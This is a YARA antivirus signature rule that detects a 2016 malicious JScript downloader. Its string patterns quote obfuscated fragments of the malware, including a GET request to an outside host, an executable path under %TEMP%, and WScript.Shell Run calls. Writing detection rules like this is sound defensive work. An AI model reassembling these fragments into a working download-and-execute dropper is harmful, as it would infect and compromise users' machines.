rule sig_20160329_a80561237653e2bf63b4a88d08b06e2e {
  meta:
    description = "datamaliciousorder - file 20160329_a80561237653e2bf63b4a88d08b06e2e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0e053185a74c20feab21da064c6662f65e7eecfa304e4182d304186c02fe454c"

  strings:
    $s1  = "function Cetxwdeocl() {return Wxaok[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ECbrS9sd4.exe\";};" fullword ascii
    $s2  = "Rxlquowe[Gtoujybt](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Rjjmvuqbi](Cumzaepg() * 11)} while (Rxlquowe[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Dcisnz(Rfenkmxb, Poluqcyp){return Rfenkmxb - Poluqcyp;};" fullword ascii
    $s5  = "var Wxaok = function Eltduyymx() {return WScript[Hjzwy](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Icumbe() {return ((Flprnyha == true) && (Flprnyha == Nlztagqqlp)) ? 1 : Gwbjak;};" fullword ascii
    $s7  = "function Rhjzh(Jcfeqgxw){Wxaok[\"Run\"](Jcfeqgxw, Gwbjak, Gwbjak);};" fullword ascii
    $s8  = "var Qvksl = new this[\"Date\"]();" fullword ascii
    $s9  = "var Kbaacui = false;" fullword ascii
    $s10 = "Flprnyha = true; " fullword ascii
    $s11 = "function Ykaxchb(){return Amprdywuv;};" fullword ascii
    $s12 = "Nlztagqqlp = true; " fullword ascii
    $s13 = "function Dqevxp(Dzxmk) {var Jysatz = (1, 2, 3, 4, 5, Dzxmk); return Jysatz;};" fullword ascii
    $s14 = "function Cumzaepg(){return 22;};" fullword ascii
    $s15 = "var Flprnyha = false;" fullword ascii
    $s16 = "var Nlztagqqlp = false;" fullword ascii
    $s17 = "function Jxfdrfizg()" fullword ascii
    $s18 = "return Dcisnz(Lpepua, Iwohv);" fullword ascii
    $s19 = "function Npvadcjy(){return Hjzwy;};" fullword ascii
    $s20 = "} catch(Esegcpayxi){Vragcacqjc = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}